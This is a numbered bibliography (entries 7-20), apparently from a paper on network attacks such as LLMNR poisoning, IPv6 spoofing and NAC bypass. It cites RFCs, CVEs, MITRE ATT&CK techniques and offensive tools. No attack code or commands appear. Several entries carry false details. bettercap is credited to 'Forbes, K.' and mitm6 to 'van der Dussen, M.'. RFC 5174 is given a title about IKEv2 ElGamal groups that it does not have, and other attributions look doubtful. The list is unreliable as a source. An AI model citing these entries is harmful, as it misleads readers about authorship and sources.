7. RFC 6106 — IPv6 Router Advertisement Options for Network Configuration. J. Jeong et al., IETF, November 2010.
8. CVE-1999-0513 — Smurf attack (ICMP amplification). NVD, 1999.
9. MITRE ATT&CK — T1113: Screen Capture; T1557: Adversary-in-the-Middle. MITRE, 2024.
10. Sogeti/ESEC — Responder: LLMNR/NBT-NS/mDNS Poisoning Tool. https://github.com/lgandx/Responder
11. Forbes, K. — bettercap: Swiss Army Knife for Network Attacks. https://www.bettercap.org/
12. RFC 5174 — IKEv2 ElGamal Groups Are No Longer Secure. J. Lepinski, IETF, May 2008.
13. NIST SP 800-81 Rev. 2 — Secure Domain Name System Deployment Guide. R. Chandramouli, S. Rose, NIST, May 2020.
14. RFC 3748 — Extensible Authentication Protocol (EAP). B. Aboba et al., IETF, June 2004.
15. van der Dussen, M. — mitm6: DHCPv6 and IPv6 Route Advertisement Spoofing. Fox-IT, 2017.
16. RFC 2516 — A Method for Transmitting PPP Over Ethernet (PPPoE). L. Mamakos et al., IETF, February 1999.
17. CVE-2011-3325 — OSPF LSA injection. NVD, 2011.
18. Portnoy, M. — NAC-Killer: Bypassing Network Access Control. DEF CON, 2015.
19. RFC 3315 — Dynamic Host Configuration Protocol for IPv6 (DHCPv6). R. Droms et al., IETF, July 2003.
20. RFC 4862 — IPv6 Stateless Address Autoconfiguration. S. Thomson et al., IETF, September 2007.